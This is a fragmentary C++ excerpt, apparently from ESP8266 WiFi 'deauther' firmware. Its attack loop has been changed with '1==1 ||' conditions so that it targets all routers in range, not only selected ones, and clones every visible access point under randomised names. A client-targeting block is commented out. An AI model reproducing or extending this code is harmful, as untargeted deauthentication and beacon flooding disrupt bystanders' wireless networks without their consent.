...
bool Attack::send(){
  ...
  delay(100); //less packets are beeing dropped
  return true;
}
...
void Attack::run(){
  ...
  if(isRunning[0] && currentMillis-prevTime[0] >= 1000){
    ...
    for(int a=0;a<apScan.results;a++){
      ...
      if(1==1 || apScan.isSelected(a)){ // attack all routers
        ...
        //Serial.println(apScan.getAPName(a));

/* skip attacking individual clients.
        // get all clients on ap
        Serial.println("<r1:0>");
        clientScan.start(server.arg("time").toInt());
        while(clientScan.sniffing)
          delay(1);        

        Serial.println("<r1:255>");
        Serial.println("<playe:10>");
        
        for(int i=0;i<clientScan.results;i++){
          
          if(1==1 || clientScan.getClientSelected(i)){ // attack all clients
            
            _selectedClients++;

            if(1==1 || settings.channelHop){ // always channel hop
...
*/
  ...
  if(isRunning[1] && currentMillis-prevTime[1] >= 100){
    ...
    for(int a=0;a<apScan.results;a++){
      ...
      if((1==1 || apScan.isSelected(a)) && !apScan.isHidden(a)){ // clone all access points
        ...
        for(int c = 0; c < 5; c++){
          ...
          switch(c) {
            ...
            case 3:
              ...
              _apName += (String)random(99);//e.g. "SAMPLEAP        78"
              break;
          }
